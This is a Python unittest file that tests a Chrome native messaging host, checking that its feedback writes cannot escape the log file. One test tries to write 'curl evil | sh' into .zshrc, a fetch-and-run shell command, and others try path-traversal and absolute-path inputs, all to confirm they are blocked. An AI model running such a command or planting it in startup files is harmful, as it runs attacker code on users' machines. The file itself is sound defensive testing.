"""Runs the real native host as Chrome would: framed JSON on stdin, framed JSON
replies on stdout. HOME points at a temp folder, so nothing outside it is touched.

    python3 -m unittest discover -s native-host
"""
import json
import os
import shutil
import struct
import subprocess
import sys
import tempfile
import unittest

HOST = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'feedbackflow_host.py')


def frame(message):
    data = json.dumps(message).encode('utf-8')
    return struct.pack('=I', len(data)) + data


def unframe(raw):
    replies = []
    while raw:
        (length,) = struct.unpack('=I', raw[:4])
        replies.append(json.loads(raw[4:4 + length]))
        raw = raw[4 + length:]
    return replies


class NativeHostPathTest(unittest.TestCase):
    def setUp(self):
        self.root = os.path.realpath(tempfile.mkdtemp())
        self.home = os.path.join(self.root, 'home')
        os.makedirs(self.home)
        self.log = os.path.join(self.home, '.feedbackflow', 'feedback.log')
        self.addCleanup(shutil.rmtree, self.root)

    def run_host(self, *messages):
        env = dict(os.environ, HOME=self.home)
        out = subprocess.run([sys.executable, HOST], input=b''.join(frame(m) for m in messages),
                             capture_output=True, env=env, timeout=10).stdout
        return unframe(out)

    def read(self, path):
        with open(path, encoding='utf-8') as f:
            return f.read()

    def test_feedback_goes_to_the_log(self):
        replies = self.run_host({'action': 'writeFeedback', 'content': 'one\n'},
                                {'action': 'writeFeedback', 'path': '.feedbackflow/feedback.log', 'content': 'two\n'})
        self.assertEqual(replies, [{'success': True}, {'success': True}])
        self.assertEqual(self.read(self.log), 'one\ntwo\n')

    def test_write_cannot_climb_out_of_home(self):
        self.run_host({'action': 'writeFeedback', 'path': '../escaped.txt', 'content': 'x'})
        self.assertFalse(os.path.exists(os.path.join(self.root, 'escaped.txt')))

    def test_write_cannot_use_an_absolute_path(self):
        target = os.path.join(self.root, 'absolute.txt')
        self.run_host({'action': 'writeFeedback', 'path': target, 'content': 'x'})
        self.assertFalse(os.path.exists(target))

    def test_write_cannot_reach_another_file_in_home(self):
        zshrc = os.path.join(self.home, '.zshrc')
        with open(zshrc, 'w') as f:
            f.write('export SAFE=1\n')
        self.run_host({'action': 'writeFeedback', 'path': '.zshrc', 'content': 'curl evil | sh\n'})
        self.assertEqual(self.read(zshrc), 'export SAFE=1\n')

    def test_clear_only_empties_the_log(self):
        zshrc = os.path.join(self.home, '.zshrc')
        with open(zshrc, 'w') as f:
            f.write('export SAFE=1\n')
        replies = self.run_host({'action': 'writeFeedback', 'content': 'old\n'},
                                {'action': 'clearFeedback', 'path': '.zshrc'})
        self.assertEqual(replies[-1], {'success': True})
        self.assertEqual(self.read(zshrc), 'export SAFE=1\n')
        self.assertTrue(self.read(self.log).startswith('# Feedback Flow Log File - Cleared on '))


if __name__ == '__main__':
    unittest.main()
